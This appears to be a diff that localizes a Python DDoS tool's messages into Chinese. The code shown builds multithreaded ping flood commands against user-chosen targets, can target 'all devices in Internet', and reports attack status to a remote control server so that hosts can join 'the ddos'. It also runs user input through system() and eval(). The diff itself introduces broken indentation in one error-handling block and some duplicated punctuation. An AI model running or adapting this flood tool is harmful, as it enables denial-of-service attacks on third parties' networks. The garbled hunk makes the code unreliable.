@@ -24,7 +24,7 @@ except ImportError:
 try:
 	import nmap
 except Exception as e:
-	print("Please install following module:", e)
+	print("请安装以下模块：", e)
 	quit()
 
 event = event()
@@ -94,26 +94,26 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		self.help()
 		if not geteuid_exists:
 			print("")
-			print("I am sorry, but this feature is currently not supported on stock Windows, try running it using wsl.")
-			print("You will be redirected to the main menu.")
+			print("很抱歉，该功能暂不支持原生 Windows 环境，请尝试通过 WSL 运行。.")
+			print("您将被重定向至主菜单。.")
 			print("")
-			input("[Press Enter]")
+			input("[按 Enter 键继续]")
 			print("")
 			var.stop()
 			return
 
 	def exit_console(self):
-		print("Have a nice day.")
+		print("祝您愉快。")
 		quit()
 
 	def run_shell(self, command):
 		print("")
-		system(tools.arg("Enter shell command: ", ". ", command))
+		system(tools.arg("输入 shell 命令：", ". ", command))
 		print("")
 
 	def debug(self, command):
 		print("")
-		eval(tools.arg("Enter debug command: ", "$ ", command))
+		eval(tools.arg("输入调试命令：", "$ ", command))
 		print("")
 
 	@event.command
@@ -151,7 +151,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	@event.event
 	def on_command_not_found(command):
 		print("")
-		print("The command you entered does not exist.")
+		print("您输入的命令不存在。")
 		print("")
 
 	def check_session(self):
@@ -192,24 +192,24 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
 			if status != "200":
 				print("")
-				print("An error occured, while sending commands to the server.")
+				print("向服务器发送命令时发生错误。")
 				print("")
 
 	@event.command
 	def debug():
 		var.l3_debug = True
 		print("")
-		print("Debugging mode enabled.")
+		print("调试模式已启用。")
 		print("")
 
 	def show_values(self):
 		print("")
-		print("Targets: %s" % var.target)
-		print("Packet Size: %s" % var.size)
-		print("Threads: %s" % var.threads)
-		print("Delay between threads: %s" % var.sleep)
-		print("Delay between packets: %s" % var.interval)
-		print("Time to auto stop: %s" % var.auto_stop)
+		print("目标：%s" % var.target)
+		print("数据包大小：%s" % var.size)
+		print("线程：%s" % var.threads)
+		print("线程间延迟：%s" % var.sleep)
+		print("数据包间延迟：%s" % var.interval)
+		print("自动停止时间：%s" % var.auto_stop)
 		print("")
 
 	def help(self):
@@ -220,51 +220,51 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	@event.command
 	def targets(command):
 		print("")
-		var.target = tools.arg("Targets (Seperated by ', '): ", "targets ", command).split(", ")
+		var.target = tools.arg("目标（用 ', ' 分隔）：", "targets ", command).split(", ")
 		for ip in var.target:
 			if "." not in ip:
-				print("This IP does not exist.")
+				print("该 IP 不存在。")
 		print("")
 
 	@event.command
 	def target(command):
 		print("")
-		var.target = tools.arg("Target: ", "target ", command)
+		var.target = tools.arg("目标：", "target ", command)
 		if "." not in var.target:
-			print("This IP does not exist.")
+			print("该 IP 不存在。")
 		print("")
 
 	@event.command
 	def size(command):
 		print(" ")
 		try:
-			sizezw = int(tools.arg("Size in kb: ", "size ", command))
+			sizezw = int(tools.arg("大小（KB）：", "size ", command))
 			if sizezw < 5:
-				print("Size needs to be more than 4kb.")
+				print("大小必须大于 4KB。")
 			elif sizezw > 65500:
-				print("Size needs to be less than 65500kb.")
+				print("大小必须小于 65500KB。")
 			else:
 				var.size = sizezw
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("执行时发生错误。", e)
 		print(" ")
 
 	@event.command
 	def threads(command):
 		print(" ")
 		try:
-			var.threads = int(tools.arg("Threads: ", "threads ", command))
+			var.threads = int(tools.arg("线程：", "threads ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("执行时发生错误。", e)
 		print(" ")
 
 	@event.command
 	def sleep(command):
 		print(" ")
 		try:
-			var.sleep = float(tools.arg("Delay between each thread: ", "sleep ", command))
+			var.sleep = float(tools.arg("线程间延迟：", "sleep ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("执行时发生错误。", e)
 		print(" ")
 
 	@event.command
@@ -303,13 +303,12 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			print("All devices in Internet are now targeted.", var.target)
 		except Exception as e:
 			if not var.nmapinstalled:
-				print("Please install nmap to continue.")
-			else:
-				print("There was an error while executing.", e)
-		print(" ")
+					print("请安装 nmap 以继续。")
+				else:
+					print("执行时发生错误。", e)
 
 	def pod(self, size, target, threads, threadssleep, podinterval, podautodl):
-		print(("Starting attack...\nC_B[Hit ENTER or CTRL + C to stop the attack]\nC_W").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
+		print(("正在开始攻击...\nC_B[按 ENTER 或 CTRL + C 停止攻击]\nC_W").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
 		targets = []
 		feat = ""
 		if podinterval != 0:
@@ -327,10 +326,10 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			output_to_dev_null = "> /dev/null "
 		for target in targets:
 			if geteuid() == 0:
-				print(("Running thread C_BwithC_W sudo privileges.").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
+				print(("正在以 C_Bsudo 权限C_W 运行线程。" ).replace("C_W", var.C_None).replace("C_B", var.C_Bold))
 				killcom = ('sudo ping -f -q -s %s %s %s %s& ' % (size, feat, target, output_to_dev_null)).replace("  ", " ")
 			else:
-				print(("Running thread C_BwithoutC_W sudo privileges.").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
+				print(("正在以 C_B无 sudo 权限C_W 运行线程。" ).replace("C_W", var.C_None).replace("C_B", var.C_Bold))
 				killcom = ("ping -q -s %s %s %s %s& " % (size, feat, target, output_to_dev_null)).replace("  ", " ")
 			try:
 				for i in range(int(threads)):
@@ -338,20 +337,19 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					sleep(float(threadssleep))
 			except KeyboardInterrupt:
 				system("killall -SIGINT ping")
-				print("Attack abort.")
+				print("攻击终止。")
 			except Exception as pingerror:
-				var.command_log.append("ERROR: %s" % pingerror)
-				print("An error was caught while executing.", pingerror)
+				var.command_log.append("错误：%s" % pingerror)
+				print("执行过程中发生错误。", pingerror)
 				system("killall -SIGINT ping")
-				print("Attack abort.")
+				print("攻击终止。")
 			try:
 				input("")
 				system("killall -SIGINT ping")
-				print("Attack abort.")
+				print("攻击终止。")
 			except Exception:
 				system("killall -SIGINT ping")
-				print("Attack abort.")
-			print("Attack abort.")
+				print("攻击终止。")
 
 	@event.command
 	def run():
@@ -359,10 +357,10 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			self.pod(var.size, var.target, var.threads, var.sleep, var.interval, var.auto_stop)
 
 			def reset_attack():
-				print("Stopping threads...")
+				print("正在停止线程...")
 				system("killall ping")
 				if var.l3_debug:
-					print("Saving debugging log...")
+					print("正在保存调试日志...")
 					output_to = path.join(getcwd(), "l3_debug_log.txt")
 
 					write_method = "a"
@@ -378,7 +376,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					output_file.write(str(version + "\n"))
 					output_file.write(str("\n".join(var.command_log)))
 					output_file.close()
-				print("Done.")
+				print("完成。")
 				quit()
 
 			def check_stopped_execution():
@@ -400,7 +398,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			if var.server[0] and var.server[1]:
 				status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
 				if status != "200":
-					print("An error occured, while sending data to the server.")
+					print("发送数据到服务器时发生错误。")
 
 			reset_attack()
 
@@ -412,22 +410,22 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					break
 				else:
 					sleep(1)
-		elif not tools.question("\nDo you agree to the terms of use?"):
-			print("Agreement not accepted.")
+		elif not tools.question("\n您是否同意使用条款？"):
+			print("未接受协议。")
 			quit()
 		else:
 			if var.server[0] and var.server[1]:
-				if tools.question("\nWould you like to use the host as part of the ddos?"):
+				if tools.question("\n是否希望将该主机用作 DDoS 的一部分？"):
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("发送数据到服务器时发生错误。")
 					execute()
 				else:
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("发送数据到服务器时发生错误。")
 					try:
-						print("[Press Enter to stop the attack.]")
+						print("[按回车停止攻击。]")
 					except KeyboardInterrupt:
 						pass
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
